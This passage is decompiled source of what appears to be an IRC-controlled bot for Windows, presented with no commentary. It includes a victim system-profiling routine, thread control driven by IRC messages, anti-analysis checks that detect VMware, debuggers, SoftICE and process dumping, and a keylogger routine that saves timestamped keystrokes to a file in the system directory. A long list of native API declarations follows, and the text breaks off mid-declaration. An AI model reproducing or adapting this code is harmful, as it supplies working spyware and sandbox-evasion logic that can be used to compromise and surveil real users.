    \u003CModule\u003E._snprintf(sinfo, 512U, (sbyte*) &\u003CModule\u003E.\u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D23, __arglist ((long) \u003CModule\u003E.GetCPUSpeed(), (IntPtr) \u003CModule\u003E.commaI64((ulong) ((uint) ^(int&) ((IntPtr) &memorystatus + 8) >> 10)), (IntPtr) \u003CModule\u003E.commaI64((ulong) ((uint) ^(int&) ((IntPtr) &memorystatus + 12) >> 10)), (DKSPKB&) ((IntPtr) &dkspkb + 256), (DKSPKB&) ((IntPtr) &dkspkb + 128), (IntPtr) numPtr, ^(int&) ((IntPtr) &osversioninfow + 4), ^(int&) ((IntPtr) &osversioninfow + 8), ^(int&) ((IntPtr) &osversioninfow + 12), out arrayTypeBy0BaeW, out arrayTypeBy0PkD, (IntPtr) \u003CModule\u003E.GetIP(sock), out arrayTypeBy0BaaW, out arrayTypeBy0EgW1, out arrayTypeBy0EgW2, (IntPtr) \u003CModule\u003E.Uptime(0)));
    return sinfo;
  }

  internal static unsafe int addthread(sbyte* name, int id, uint sock)
  {
    int num1 = 0;
    THREAD* threadPtr = (THREAD*) &\u003CModule\u003E.threads;
    while (*(sbyte*) threadPtr != (sbyte) 0)
    {
      ++num1;
      threadPtr += 564;
      // ISSUE: cast to a reference type
      if ((IntPtr) threadPtr >= (\u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UTHREAD\u0040\u0040&) ((IntPtr) &\u003CModule\u003E.threads + 144384))
        goto label_4;
    }
    int num2 = num1 * 564;
    \u003CModule\u003E.strncpy((sbyte*) (num2 + (IntPtr) &\u003CModule\u003E.threads), name, 511U);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num2 + ((IntPtr) &\u003CModule\u003E.threads + 512)) = id;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num2 + ((IntPtr) &\u003CModule\u003E.threads + 516)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num2 + ((IntPtr) &\u003CModule\u003E.threads + 520)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num2 + ((IntPtr) &\u003CModule\u003E.threads + 524)) = (int) sock;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) (num2 + ((IntPtr) &\u003CModule\u003E.threads + 536)) = (sbyte) 0;
label_4:
    return num1;
  }

  internal static unsafe uint ListThread(void* param)
  {
    TLIST tlist;
    // ISSUE: cpblk instruction
    __memcpy(ref tlist, (IntPtr) param, 152);
    *(int*) ((IntPtr) param + 148) = 1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    \u003CModule\u003E.listthreads((uint) ^(int&) ref tlist, (sbyte*) ((IntPtr) &tlist + 4), ^(int&) ((IntPtr) &tlist + 140), ^(int&) ((IntPtr) &tlist + 136));
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    \u003CModule\u003E.clearthread(^(int&) ((IntPtr) &tlist + 132));
    \u003CModule\u003E.ExitThread(0U);
    return 0;
  }

  internal static unsafe void listthreads(uint sock, sbyte* chan, int notice, int full)
  {
    \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &\u003CModule\u003E.\u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D0, notice, 0);
    int num1 = 0;
    THREAD* threadPtr = (THREAD*) &\u003CModule\u003E.threads;
    int num2 = (int) ((IntPtr) &\u003CModule\u003E.threads + 516);
    // ISSUE: cast to a reference type
    do
    {
      if (*(sbyte*) threadPtr != (sbyte) 0 && (full != 0 || *(int*) num2 == 0))
      {
        \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD;
        \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D1, __arglist (num1, (IntPtr) threadPtr));
        \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 1);
      }
      ++num1;
      num2 += 564;
      threadPtr += 564;
    }
    while (num2 < (\u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UTHREAD\u0040\u0040&) ((IntPtr) &\u003CModule\u003E.threads + 144900));
  }

  internal static int killthread(int threadnum) => 0;

  internal static unsafe int killthreadall()
  {
    int num = 0;
    int threadnum = 0;
    THREAD* threadPtr = (THREAD*) &\u003CModule\u003E.threads;
    // ISSUE: cast to a reference type
    do
    {
      if (*(sbyte*) threadPtr != (sbyte) 0 && \u003CModule\u003E.killthread(threadnum) != 0)
        ++num;
      ++threadnum;
      threadPtr += 564;
    }
    while ((IntPtr) threadPtr < (\u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UTHREAD\u0040\u0040&) ((IntPtr) &\u003CModule\u003E.threads + 144384));
    return num;
  }

  internal static unsafe int killthreadid(int threadid, int threadnum)
  {
    int num1 = 0;
    int threadnum1 = 0;
    int num2 = (int) ((IntPtr) &\u003CModule\u003E.threads + 516);
    int num3 = (int) ((IntPtr) &\u003CModule\u003E.threads + 512);
    // ISSUE: cast to a reference type
    do
    {
      if (*(int*) num3 == threadid)
      {
        if (threadnum > 0)
        {
          if ((*(int*) num2 == threadnum || threadnum1 == threadnum) && \u003CModule\u003E.killthread(threadnum1) != 0)
            ++num1;
        }
        else if (\u003CModule\u003E.killthread(threadnum1) != 0)
          ++num1;
      }
      ++threadnum1;
      num3 += 564;
      num2 += 564;
    }
    while (num3 < (\u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UTHREAD\u0040\u0040&) ((IntPtr) &\u003CModule\u003E.threads + 144896));
    return num1;
  }

  internal static unsafe int findthreadid(int threadid)
  {
    int num1 = 0;
    int num2 = (int) ((IntPtr) &\u003CModule\u003E.threads + 512);
    // ISSUE: cast to a reference type
    do
    {
      if (*(int*) num2 == threadid)
        ++num1;
      num2 += 564;
    }
    while (num2 < (\u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UTHREAD\u0040\u0040&) ((IntPtr) &\u003CModule\u003E.threads + 144896));
    return num1;
  }

  internal static unsafe int findthreadnum(int threadid)
  {
    int num1 = 0;
    int num2 = 0;
    int num3 = (int) ((IntPtr) &\u003CModule\u003E.threads + 512);
    while (*(int*) num3 != threadid)
    {
      ++num2;
      num3 += 564;
      // ISSUE: cast to a reference type
      if (num3 >= (\u0024ArrayType\u0024\u0024\u0024BY0BAA\u0040UTHREAD\u0040\u0040&) ((IntPtr) &\u003CModule\u003E.threads + 144896))
        goto label_4;
    }
    num1 = num2;
label_4:
    return num1;
  }

  internal static unsafe void stopthread(
    uint sock,
    sbyte* chan,
    int notice,
    int silent,
    sbyte* name,
    sbyte* desc,
    int threadid,
    sbyte* thread)
  {
    int threadnum = 0;
    if ((IntPtr) thread != IntPtr.Zero)
      threadnum = \u003CModule\u003E.atoi(thread);
    int num = \u003CModule\u003E.killthreadid(threadid, threadnum);
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD;
    if (num > 0)
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D2, __arglist ((IntPtr) name, (IntPtr) desc, num));
    else
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D3, __arglist ((IntPtr) name, (IntPtr) desc));
    if (silent != 0)
      return;
    \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
  }

  internal static unsafe void clearthread(int threadnum)
  {
    int num = threadnum * 564;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num + ((IntPtr) &\u003CModule\u003E.threads + 532)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num + ((IntPtr) &\u003CModule\u003E.threads + 512)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num + ((IntPtr) &\u003CModule\u003E.threads + 516)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num + ((IntPtr) &\u003CModule\u003E.threads + 520)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num + ((IntPtr) &\u003CModule\u003E.threads + 524)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) (num + ((IntPtr) &\u003CModule\u003E.threads + 528)) = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) (num + (IntPtr) &\u003CModule\u003E.threads) = (sbyte) 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) (num + ((IntPtr) &\u003CModule\u003E.threads + 536)) = (sbyte) 0;
  }

  internal static unsafe int VMGetVersion()
  {
    uint num1 = 10;
    uint num2;
    uint num3;
    \u003CModule\u003E.VMBackDoor(&num2, &num3, &num1, (uint*) 0);
    return num3 != 1447909480U ? 0 : (int) num2;
  }

  internal static int isVMWare() => \u003CModule\u003E.VMGetVersion() == 0 ? 0 : 1;

  internal static unsafe int isDebug()
  {
    if (\u003CModule\u003E.m_bIsDebug != 0)
      return 1;
    // ISSUE: cast to a function pointer type
    __FnPtr<int ()> local = (__FnPtr<int ()>) 0;
    HINSTANCE__* hinstancePtr = \u003CModule\u003E.GetModuleHandleW((char*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D0);
    if ((IntPtr) hinstancePtr == IntPtr.Zero)
    {
      hinstancePtr = \u003CModule\u003E.LoadLibraryW((char*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D1);
      if ((IntPtr) hinstancePtr == IntPtr.Zero)
        goto label_5;
    }
    local = \u003CModule\u003E.GetProcAddress(hinstancePtr, (sbyte*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D2);
label_5:
    \u003CModule\u003E.foolProcDump();
    uint tickCount = \u003CModule\u003E.GetTickCount();
    if (\u003CModule\u003E.IsBPX((void*) \u003CModule\u003E.__unep\u0040\u003FIsSICELoaded\u0040\u0040\u0024\u0024FYA_NXZ))
    {
      \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D3, __arglist ());
      \u003CModule\u003E.m_bIsDebug = 1;
      return 1;
    }
    if (\u003CModule\u003E.IsBPX((void*) \u003CModule\u003E.__unep\u0040\u003FIsBPX\u0040\u0040\u0024\u0024FYA_NPAX\u0040Z))
    {
      \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D4, __arglist ());
      \u003CModule\u003E.m_bIsDebug = 1;
      return 1;
    }
    if (\u003CModule\u003E.isVMWare() != 0)
    {
      \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D5, __arglist ());
      \u003CModule\u003E.m_bIsDebug = 1;
      return 1;
    }
    if (local != null)
    {
      if (\u003CModule\u003E.IsBPX((void*) &local))
      {
        \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D6, __arglist ());
        \u003CModule\u003E.m_bIsDebug = 1;
        return 1;
      }
      // ISSUE: function pointer call
      if (__calli(local)() != 0)
      {
        \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D7, __arglist ());
        \u003CModule\u003E.m_bIsDebug = 1;
        return 1;
      }
    }
    if (\u003CModule\u003E.GetTickCount() - tickCount <= 5000U)
      return 0;
    \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D8, __arglist ());
    \u003CModule\u003E.m_bIsDebug = 1;
    return 1;
  }

  internal static unsafe int SaveKeys(sbyte* key, KEYLOG keylog)
  {
    _SYSTEMTIME systemtime;
    \u003CModule\u003E.GetLocalTime(&systemtime);
    \u0024ArrayType\u0024\u0024\u0024BY0BAE\u0040_W arrayTypeBy0BaeW;
    int systemDirectoryW = (int) \u003CModule\u003E.GetSystemDirectoryW((char*) &arrayTypeBy0BaeW, 520U);
    \u003CModule\u003E.wcscat((char*) &arrayTypeBy0BaeW, (char*) &\u003CModule\u003E.\u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D0);
    \u003CModule\u003E.wcscat((char*) &arrayTypeBy0BaeW, (char*) &\u003CModule\u003E.keylogfile);
    _iobuf* iobufPtr = \u003CModule\u003E._wfopen((char*) &arrayTypeBy0BaeW, (char*) &\u003CModule\u003E.\u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D1);
    if ((IntPtr) iobufPtr == IntPtr.Zero)
      return 1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    \u003CModule\u003E.fprintf(iobufPtr, (sbyte*) &\u003CModule\u003E.\u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D2, __arglist ((int) ^(ushort&) ((IntPtr) &systemtime + 2), (int) ^(ushort&) ((IntPtr) &systemtime + 6), (int) ^(ushort&) ref systemtime, (int) ^(ushort&) ((IntPtr) &systemtime + 8), (int) ^(ushort&) ((IntPtr) &systemtime + 10), (int) ^(ushort&) ((IntPtr) &systemtime + 12), (IntPtr) key));
    \u003CModule\u003E.fclose(iobufPtr);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ((IntPtr) &keylog + 140) == 0)
    {
      \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040_W arrayTypeBy0CaaW;
      \u003CModule\u003E.\u003FA0xc25c7cbf\u002Eswprintf((char*) &arrayTypeBy0CaaW, 1024U, (char*) &\u003CModule\u003E.\u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D3, __arglist ((IntPtr) key));
    }
    return 0;
  }

  internal static unsafe uint KeyLoggerThread(void* param)
  {
    \u003CModule\u003E.ExitThread(0U);
    return 0;
  }

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern uint _WinMainCRTStartup();

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _getFiberPtrId();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void _amsg_exit([In] int obj0);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern void __security_init_cookie();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void Sleep([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(
    [In] string obj0,
    [In] Exception obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(
    [In] string obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EDoDllLanguageSupportValidation();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(
    [In] Exception obj0,
    [In] Exception obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002ERegisterModuleUninitializer(
    [In] EventHandler obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void \u003CCrtImplementationDetails\u003E\u002EDoCallBackInDefaultDomain(
    [In] __FnPtr<int (void*)> obj0,
    [In] void* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void _cexit();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _encode_pointer([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _decode_pointer([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _encoded_null();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int __FrameUnwindFilter([In] _EXCEPTION_POINTERS* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int sprintf([In] sbyte* obj0, [In] sbyte* obj1, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _iobuf* _fdopen([In] int obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int _open_osfhandle([In] int obj0, [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int SetConsoleCtrlHandler([In] __FnPtr<int (uint)> obj0, [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* GetStdHandle([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int setvbuf([In] _iobuf* obj0, [In] sbyte* obj1, [In] int obj2, [In] uint obj3);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _iobuf* __iob_func();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int AllocConsole();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int printf([In] sbyte* obj0, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint wcslen([In] char* obj0);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int \u003FA0xc00eb828\u002Eswprintf(
    [In] char* obj0,
    [In] uint obj1,
    [In] char* obj2, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int swprintf([In] char* obj0, [In] char* obj1, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* CreateThread(
    [In] _SECURITY_ATTRIBUTES* obj0,
    [In] uint obj1,
    [In] __FnPtr<uint (void*)> obj2,
    [In] void* obj3,
    [In] uint obj4,
    [In] uint* obj5);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int SetFileAttributesW([In] char* obj0, [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void irc_sendv([In] uint obj0, [In] sbyte* obj1, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strcat([In] sbyte* obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern uint GetLastError();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int strcmp([In] sbyte* obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int rand();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void _wsplitpath(
    [In] char* obj0,
    [In] char* obj1,
    [In] char* obj2,
    [In] char* obj3,
    [In] char* obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int MultiByteToWideChar(
    [In] uint obj0,
    [In] uint obj1,
    [In] sbyte* obj2,
    [In] int obj3,
    [In] char* obj4,
    [In] int obj5);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* memset([In] void* obj0, [In] int obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint GetModuleFileNameW([In] HINSTANCE__* obj0, [In] char* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strtok([In] sbyte* obj0, [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strncpy([In] sbyte* obj0, [In] sbyte* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int _vswprintf_c_l(
    [In] char* obj0,
    [In] uint obj1,
    [In] char* obj2,
    [In] localeinfo_struct* obj3,
    [In] sbyte* obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint GetFileAttributesW([In] char* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int _vswprintf([In] char* obj0, [In] char* obj1, [In] sbyte* obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int CopyFileW([In] char* obj0, [In] char* obj1, [In] int obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint GetSystemDirectoryW([In] char* obj0, [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int _snprintf([In] sbyte* obj0, [In] uint obj1, [In] sbyte* obj2, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int atoi([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* strchr([In] sbyte* obj0, [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
